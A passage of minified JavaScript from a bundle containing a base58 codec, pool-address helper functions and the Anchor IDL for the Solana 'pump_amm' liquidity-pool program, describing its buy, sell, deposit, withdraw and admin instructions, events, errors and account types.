      for (; t[i] === r; ) s++, i++;
      const u = ((t.length - i) * o + 1) >>> 0,
        c = new Uint8Array(u);
      for (; i < t.length; ) {
        const r = t.charCodeAt(i);
        if (r > 255) return;
        let o = e[r];
        if (255 === o) return;
        let s = 0;
        for (let t = u - 1; (0 !== o || s < a) && -1 !== t; t--, s++)
          (o += (n * c[t]) >>> 0),
            (c[t] = o % 256 >>> 0),
            (o = (o / 256) >>> 0);
        if (0 !== o) throw new Error("Non-zero carry");
        (a = s), i++;
      }
      let l = u - a;
      for (; l !== u && 0 === c[l]; ) l++;
      const d = new Uint8Array(s + (u - l));
      let f = s;
      for (; l !== u; ) d[f++] = c[l++];
      return d;
    }
    return {
      encode: function (e) {
        if (
          (e instanceof Uint8Array ||
            (ArrayBuffer.isView(e)
              ? (e = new Uint8Array(e.buffer, e.byteOffset, e.byteLength))
              : Array.isArray(e) && (e = Uint8Array.from(e))),
          !(e instanceof Uint8Array))
        )
          throw new TypeError("Expected Uint8Array");
        if (0 === e.length) return "";
        let o = 0,
          s = 0,
          a = 0;
        const u = e.length;
        for (; a !== u && 0 === e[a]; ) a++, o++;
        const c = ((u - a) * i + 1) >>> 0,
          l = new Uint8Array(c);
        for (; a !== u; ) {
          let t = e[a],
            r = 0;
          for (let e = c - 1; (0 !== t || r < s) && -1 !== e; e--, r++)
            (t += (256 * l[e]) >>> 0),
              (l[e] = t % n >>> 0),
              (t = (t / n) >>> 0);
          if (0 !== t) throw new Error("Non-zero carry");
          (s = r), a++;
        }
        let d = c - s;
        for (; d !== c && 0 === l[d]; ) d++;
        let f = r.repeat(o);
        for (; d < c; ++d) f += t.charAt(l[d]);
        return f;
      },
      decodeUnsafe: s,
      decode: function (t) {
        const e = s(t);
        if (e) return e;
        throw new Error("Non-base" + n + " character");
      },
    };
  })("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz");
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var Vm = "pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA",
    Hm = new Xi(Vm);
  function Xm(t, e, n, r, o = Hm) {
    return Xi.findProgramAddressSync(
      [
        ct.from("pool"),
        new Zn(t).toArrayLike(ct, "le", 2),
        e.toBuffer(),
        n.toBuffer(),
        r.toBuffer(),
      ],
      o
    );
  }
  function Zm(t = Hm) {
    return Xi.findProgramAddressSync([ct.from("__event_authority")], t);
  }
  function Jm(t, e, n, r, o) {
    if (e < 0 || e > 100)
      throw new Error("Slippage must be between 0 and 100 (0% to 100%)");
    const i = t.mul(r).div(n),
      s = new Zn(1e9 * (1 + e / 100)),
      a = t.mul(s).div(new Zn(1e9)),
      u = i.mul(s).div(new Zn(1e9));
    return { token1: i, lpToken: t.mul(o).div(n), maxToken0: a, maxToken1: u };
  }
  function Ym(t, e) {
    return t.add(e).sub(new Zn(1)).div(e);
  }
  new Xi("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P");
  var Qm = {
    address: "pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA",
    metadata: {
      name: "pump_amm",
      version: "0.1.0",
      spec: "0.1.0",
      description: "Created with Anchor",
    },
    instructions: [
      {
        name: "buy",
        discriminator: [102, 6, 61, 18, 1, 218, 235, 234],
        accounts: [
          { name: "pool" },
          { name: "user", writable: !0, signer: !0 },
          { name: "global_config" },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          { name: "protocol_fee_recipient" },
          {
            name: "protocol_fee_recipient_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "protocol_fee_recipient" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "base_token_program" },
          { name: "quote_token_program" },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
          {
            name: "coin_creator_vault_ata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "coin_creator_vault_authority" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "coin_creator_vault_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 95, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "pool.coin_creator", account: "Pool" },
              ],
            },
          },
        ],
        args: [
          { name: "base_amount_out", type: "u64" },
          { name: "max_quote_amount_in", type: "u64" },
        ],
      },
      {
        name: "collect_coin_creator_fee",
        discriminator: [160, 57, 89, 42, 181, 139, 43, 66],
        accounts: [
          { name: "quote_mint" },
          { name: "quote_token_program" },
          { name: "coin_creator", signer: !0 },
          {
            name: "coin_creator_vault_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 95, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "coin_creator" },
              ],
            },
          },
          {
            name: "coin_creator_vault_ata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "coin_creator_vault_authority" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "coin_creator_token_account", writable: !0 },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "create_config",
        discriminator: [201, 207, 243, 114, 75, 111, 47, 189],
        accounts: [
          {
            name: "admin",
            writable: !0,
            signer: !0,
            address: "8LWu7QM2dGR1G8nKDHthckea57bkCzXyBTAKPJUBDHo8",
          },
          {
            name: "global_config",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    103, 108, 111, 98, 97, 108, 95, 99, 111, 110, 102, 105, 103,
                  ],
                },
              ],
            },
          },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_fee_basis_points", type: "u64" },
          { name: "protocol_fee_basis_points", type: "u64" },
          { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
          { name: "coin_creator_fee_basis_points", type: "u64" },
        ],
      },
      {
        name: "create_pool",
        discriminator: [233, 146, 209, 142, 207, 104, 64, 188],
        accounts: [
          {
            name: "pool",
            writable: !0,
            pda: {
              seeds: [
                { kind: "const", value: [112, 111, 111, 108] },
                { kind: "arg", path: "index" },
                { kind: "account", path: "creator" },
                { kind: "account", path: "base_mint" },
                { kind: "account", path: "quote_mint" },
              ],
            },
          },
          { name: "global_config" },
          { name: "creator", writable: !0, signer: !0 },
          { name: "base_mint" },
          { name: "quote_mint" },
          {
            name: "lp_mint",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    112, 111, 111, 108, 95, 108, 112, 95, 109, 105, 110, 116,
                  ],
                },
                { kind: "account", path: "pool" },
              ],
            },
          },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          {
            name: "user_pool_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "creator" },
                { kind: "account", path: "token_2022_program" },
                { kind: "account", path: "lp_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "pool_base_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "base_token_program" },
                { kind: "account", path: "base_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          { name: "base_token_program" },
          { name: "quote_token_program" },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "index", type: "u16" },
          { name: "base_amount_in", type: "u64" },
          { name: "quote_amount_in", type: "u64" },
          { name: "coin_creator", type: "pubkey" },
        ],
      },
      {
        name: "deposit",
        discriminator: [242, 35, 198, 137, 82, 225, 242, 182],
        accounts: [
          { name: "pool", writable: !0 },
          { name: "global_config" },
          { name: "user", signer: !0 },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "lp_mint", writable: !0, relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          { name: "user_pool_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_token_amount_out", type: "u64" },
          { name: "max_base_amount_in", type: "u64" },
          { name: "max_quote_amount_in", type: "u64" },
        ],
      },
      {
        name: "disable",
        discriminator: [185, 173, 187, 90, 216, 15, 238, 233],
        accounts: [
          { name: "admin", signer: !0, relations: ["global_config"] },
          { name: "global_config", writable: !0 },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "disable_create_pool", type: "bool" },
          { name: "disable_deposit", type: "bool" },
          { name: "disable_withdraw", type: "bool" },
          { name: "disable_buy", type: "bool" },
          { name: "disable_sell", type: "bool" },
        ],
      },
      {
        name: "extend_account",
        discriminator: [234, 102, 194, 203, 150, 72, 62, 229],
        accounts: [
          { name: "account", writable: !0 },
          { name: "user", signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "sell",
        discriminator: [51, 230, 133, 164, 1, 127, 131, 173],
        accounts: [
          { name: "pool" },
          { name: "user", writable: !0, signer: !0 },
          { name: "global_config" },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          { name: "protocol_fee_recipient" },
          {
            name: "protocol_fee_recipient_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "protocol_fee_recipient" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "base_token_program" },
          { name: "quote_token_program" },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
          {
            name: "coin_creator_vault_ata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "coin_creator_vault_authority" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "coin_creator_vault_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 95, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "pool.coin_creator", account: "Pool" },
              ],
            },
          },
        ],
        args: [
          { name: "base_amount_in", type: "u64" },
          { name: "min_quote_amount_out", type: "u64" },
        ],
      },
      {
        name: "set_coin_creator",
        docs: [
          "Sets Pool::coin_creator from Metaplex metadata creator or BondingCurve::creator",
        ],
        discriminator: [210, 149, 128, 45, 188, 58, 78, 175],
        accounts: [
          { name: "pool", writable: !0 },
          {
            name: "metadata",
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "pool.base_mint", account: "Pool" },
              ],
              program: {
                kind: "const",
                value: [
                  11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                  4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                  209, 188, 3, 248, 41, 70,
                ],
              },
            },
          },
          {
            name: "bonding_curve",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "pool.base_mint", account: "Pool" },
              ],
              program: {
                kind: "const",
                value: [
                  1, 86, 224, 246, 147, 102, 90, 207, 68, 219, 21, 104, 191, 23,
                  91, 170, 81, 137, 203, 151, 245, 210, 255, 59, 101, 93, 43,
                  182, 253, 109, 24, 176,
                ],
              },
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "update_admin",
        discriminator: [161, 176, 40, 213, 60, 184, 179, 228],
        accounts: [
          { name: "admin", signer: !0, relations: ["global_config"] },
          { name: "global_config", writable: !0 },
          { name: "new_admin" },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "update_fee_config",
        discriminator: [104, 184, 103, 242, 88, 151, 107, 20],
        accounts: [
          { name: "admin", signer: !0, relations: ["global_config"] },
          { name: "global_config", writable: !0 },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_fee_basis_points", type: "u64" },
          { name: "protocol_fee_basis_points", type: "u64" },
          { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
          { name: "coin_creator_fee_basis_points", type: "u64" },
        ],
      },
      {
        name: "withdraw",
        discriminator: [183, 18, 70, 156, 148, 109, 161, 34],
        accounts: [
          { name: "pool", writable: !0 },
          { name: "global_config" },
          { name: "user", signer: !0 },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "lp_mint", writable: !0, relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          { name: "user_pool_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_token_amount_in", type: "u64" },
          { name: "min_base_amount_out", type: "u64" },
          { name: "min_quote_amount_out", type: "u64" },
        ],
      },
    ],
    accounts: [
      {
        name: "BondingCurve",
        discriminator: [23, 183, 248, 55, 96, 216, 172, 96],
      },
      {
        name: "GlobalConfig",
        discriminator: [149, 8, 156, 202, 160, 252, 176, 217],
      },
      { name: "Pool", discriminator: [241, 154, 109, 4, 17, 177, 109, 188] },
    ],
    events: [
      {
        name: "BuyEvent",
        discriminator: [103, 244, 82, 31, 44, 245, 119, 119],
      },
      {
        name: "CollectCoinCreatorFeeEvent",
        discriminator: [232, 245, 194, 238, 234, 218, 58, 89],
      },
      {
        name: "CreateConfigEvent",
        discriminator: [107, 52, 89, 129, 55, 226, 81, 22],
      },
      {
        name: "CreatePoolEvent",
        discriminator: [177, 49, 12, 210, 160, 118, 167, 116],
      },
      {
        name: "DepositEvent",
        discriminator: [120, 248, 61, 83, 31, 142, 107, 144],
      },
      {
        name: "DisableEvent",
        discriminator: [107, 253, 193, 76, 228, 202, 27, 104],
      },
      {
        name: "ExtendAccountEvent",
        discriminator: [97, 97, 215, 144, 93, 146, 22, 124],
      },
      { name: "SellEvent", discriminator: [62, 47, 55, 10, 165, 3, 220, 42] },
      {
        name: "SetBondingCurveCoinCreatorEvent",
        discriminator: [242, 231, 235, 102, 65, 99, 189, 211],
      },
      {
        name: "SetMetaplexCoinCreatorEvent",
        discriminator: [150, 107, 199, 123, 124, 207, 102, 228],
      },
      {
        name: "UpdateAdminEvent",
        discriminator: [225, 152, 171, 87, 246, 63, 66, 234],
      },
      {
        name: "UpdateFeeConfigEvent",
        discriminator: [90, 23, 65, 35, 62, 244, 188, 208],
      },
      {
        name: "WithdrawEvent",
        discriminator: [22, 9, 133, 26, 160, 44, 71, 192],
      },
    ],
    errors: [
      { code: 6e3, name: "FeeBasisPointsExceedsMaximum" },
      { code: 6001, name: "ZeroBaseAmount" },
      { code: 6002, name: "ZeroQuoteAmount" },
      { code: 6003, name: "TooLittlePoolTokenLiquidity" },
      { code: 6004, name: "ExceededSlippage" },
      { code: 6005, name: "InvalidAdmin" },
      { code: 6006, name: "UnsupportedBaseMint" },
      { code: 6007, name: "UnsupportedQuoteMint" },
      { code: 6008, name: "InvalidBaseMint" },
      { code: 6009, name: "InvalidQuoteMint" },
      { code: 6010, name: "InvalidLpMint" },
      { code: 6011, name: "AllProtocolFeeRecipientsShouldBeNonZero" },
      { code: 6012, name: "UnsortedNotUniqueProtocolFeeRecipients" },
      { code: 6013, name: "InvalidProtocolFeeRecipient" },
      { code: 6014, name: "InvalidPoolBaseTokenAccount" },
      { code: 6015, name: "InvalidPoolQuoteTokenAccount" },
      { code: 6016, name: "BuyMoreBaseAmountThanPoolReserves" },
      { code: 6017, name: "DisabledCreatePool" },
      { code: 6018, name: "DisabledDeposit" },
      { code: 6019, name: "DisabledWithdraw" },
      { code: 6020, name: "DisabledBuy" },
      { code: 6021, name: "DisabledSell" },
      { code: 6022, name: "SameMint" },
      { code: 6023, name: "Overflow" },
      { code: 6024, name: "Truncation" },
      { code: 6025, name: "DivisionByZero" },
      { code: 6026, name: "NewSizeLessThanCurrentSize" },
      { code: 6027, name: "AccountTypeNotSupported" },
      { code: 6028, name: "OnlyCanonicalPumpPoolsCanHaveCoinCreator" },
    ],
    types: [
      {
        name: "BondingCurve",
        type: {
          kind: "struct",
          fields: [
            { name: "virtual_token_reserves", type: "u64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "real_sol_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "complete", type: "bool" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "BuyEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_amount_out", type: "u64" },
            { name: "max_quote_amount_in", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "quote_amount_in", type: "u64" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "lp_fee", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee", type: "u64" },
            { name: "quote_amount_in_with_lp_fee", type: "u64" },
            { name: "user_quote_amount_in", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "protocol_fee_recipient", type: "pubkey" },
            { name: "protocol_fee_recipient_token_account", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
            { name: "coin_creator_fee_basis_points", type: "u64" },
            { name: "coin_creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "CollectCoinCreatorFeeEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "coin_creator", type: "pubkey" },
            { name: "coin_creator_fee", type: "u64" },
            { name: "coin_creator_vault_ata", type: "pubkey" },
            { name: "coin_creator_token_account", type: "pubkey" },
          ],
        },
      },
      {
        name: "CreateConfigEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
            { name: "coin_creator_fee_basis_points", type: "u64" },
          ],
        },
      },
      {
        name: "CreatePoolEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "index", type: "u16" },
            { name: "creator", type: "pubkey" },
            { name: "base_mint", type: "pubkey" },
            { name: "quote_mint", type: "pubkey" },
            { name: "base_mint_decimals", type: "u8" },
            { name: "quote_mint_decimals", type: "u8" },
            { name: "base_amount_in", type: "u64" },
            { name: "quote_amount_in", type: "u64" },
            { name: "pool_base_amount", type: "u64" },
            { name: "pool_quote_amount", type: "u64" },
            { name: "minimum_liquidity", type: "u64" },
            { name: "initial_liquidity", type: "u64" },
            { name: "lp_token_amount_out", type: "u64" },
            { name: "pool_bump", type: "u8" },
            { name: "pool", type: "pubkey" },
            { name: "lp_mint", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "DepositEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "lp_token_amount_out", type: "u64" },
            { name: "max_base_amount_in", type: "u64" },
            { name: "max_quote_amount_in", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "base_amount_in", type: "u64" },
            { name: "quote_amount_in", type: "u64" },
            { name: "lp_mint_supply", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "user_pool_token_account", type: "pubkey" },
          ],
        },
      },
      {
        name: "DisableEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "disable_create_pool", type: "bool" },
            { name: "disable_deposit", type: "bool" },
            { name: "disable_withdraw", type: "bool" },
            { name: "disable_buy", type: "bool" },
            { name: "disable_sell", type: "bool" },
          ],
        },
      },
      {
        name: "ExtendAccountEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "account", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "current_size", type: "u64" },
            { name: "new_size", type: "u64" },
          ],
        },
      },
      {
        name: "GlobalConfig",
        type: {
          kind: "struct",
          fields: [
            { name: "admin", docs: ["The admin pubkey"], type: "pubkey" },
            {
              name: "lp_fee_basis_points",
              docs: ["The lp fee in basis points (0.01%)"],
              type: "u64",
            },
            {
              name: "protocol_fee_basis_points",
              docs: ["The protocol fee in basis points (0.01%)"],
              type: "u64",
            },
            {
              name: "disable_flags",
              docs: [
                "Flags to disable certain functionality",
                "bit 0 - Disable create pool",
                "bit 1 - Disable deposit",
                "bit 2 - Disable withdraw",
                "bit 3 - Disable buy",
                "bit 4 - Disable sell",
              ],
              type: "u8",
            },
            {
              name: "protocol_fee_recipients",
              docs: ["Addresses of the protocol fee recipients"],
              type: { array: ["pubkey", 8] },
            },
            {
              name: "coin_creator_fee_basis_points",
              docs: ["The coin creator fee in basis points (0.01%)"],
              type: "u64",
            },
          ],
        },
      },
      {
        name: "Pool",
        type: {
          kind: "struct",
          fields: [
            { name: "pool_bump", type: "u8" },
            { name: "index", type: "u16" },
            { name: "creator", type: "pubkey" },
            { name: "base_mint", type: "pubkey" },
            { name: "quote_mint", type: "pubkey" },
            { name: "lp_mint", type: "pubkey" },
            { name: "pool_base_token_account", type: "pubkey" },
            { name: "pool_quote_token_account", type: "pubkey" },
            {
              name: "lp_supply",
              docs: ["True circulating supply without burns and lock-ups"],
              type: "u64",
            },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SellEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_amount_in", type: "u64" },
            { name: "min_quote_amount_out", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "quote_amount_out", type: "u64" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "lp_fee", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee", type: "u64" },
            { name: "quote_amount_out_without_lp_fee", type: "u64" },
